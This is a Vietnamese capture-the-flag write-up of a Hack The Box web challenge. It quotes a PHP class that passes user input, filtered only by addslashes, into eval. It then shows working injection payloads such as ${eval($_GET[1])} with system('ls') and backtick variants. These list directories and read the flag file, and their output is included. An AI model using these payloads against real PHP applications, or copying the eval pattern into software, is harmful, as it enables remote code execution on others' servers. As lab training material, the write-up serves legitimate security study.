Đầu tiên ở trong file `models/TimeModel.php` ta thấy có đoạn code:
```php
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);

        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
        $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}
```
Hàm này nhận tham số đầu vào là `format` nhưng chỉ validate bằng hàm `addslashes`. Sau đó thực thi bằng hàm `eval` -> khả năng ta sẽ thực hiện RCE ở đây.

GET `http://142.93.37.215:31829/?format=${eval($_GET[1])}&1=phpinfo();`
```
System	Linux weblovetok-992149-86bd695864-nvnbq 5.10.0-0.deb10.17-amd64 #1 SMP Debian 5.10.136-1~deb10u3 (2022-09-06) x86_64
Build Date	Jan 12 2021 13:59:46
Server API	FPM/FastCGI
Virtual Directory Support	disabled
Configuration File (php.ini) Path	/etc/php/7.4/fpm
Loaded Configuration File	/etc/php/7.4/fpm/php.ini
Scan this dir for additional .ini files	/etc/php/7.4/fpm/conf.d
...
```

GET `http://142.93.37.215:31829/?format=${eval($_GET[1])}&1=system(%27ls%27);`
```
Router.php assets controllers index.php models static views
```

GET `http://142.93.37.215:31829/?format=${eval($_GET[1])}&1=system(%27ls%20../%27);`
```
bin boot dev entrypoint.sh etc flagtJjnW home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www
```

GET `http://142.93.37.215:31829/?format=${eval($_GET[1])}&1=system(%27cat%20../flagtJjnW%27);`
```
HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
```

Ở đây chúng ta cũng có thể sử dụng payload khác ngắn gọn hơn:

GET `http://142.93.37.215:31829/?format=${print(`\`ls\``)}`
```
Router.php assets controllers index.php models static views
```

GET `http://142.93.37.215:31829/?format=${print(`\`ls%20..\``)}`
```
bin boot dev entrypoint.sh etc flagtJjnW home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var www
```

GET `http://142.93.37.215:31829/?format=${print(`\`cat%20../flagtJjnW\``)}`
```
HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}
```